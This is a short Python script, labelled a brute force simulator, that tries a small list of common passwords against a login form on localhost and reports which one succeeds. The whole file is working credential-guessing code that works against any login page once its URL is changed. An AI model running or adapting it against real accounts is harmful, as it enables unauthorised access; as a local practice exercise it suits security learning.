import requests

print("Brute force simulator started...")

def brute_force_sim(url, username, wordlist):
    for pwd in wordlist:
        response = requests.post(
            url,
            data={"username": username, "password": pwd},
            timeout=5
        )

        if "Welcome" in response.text:
            print(f"[+] FOUND: {username}:{pwd}")
            return pwd
        else:
            print(f"[-] Failed: {pwd}")

    print("[-] Password not found.")
    return None


url = "http://127.0.0.1:5000/login"
username = "admin"

wordlist = [
    "password",
    "123456",
    "admin",
    "letmein",
    "welcome"
]

brute_force_sim(url, username, wordlist)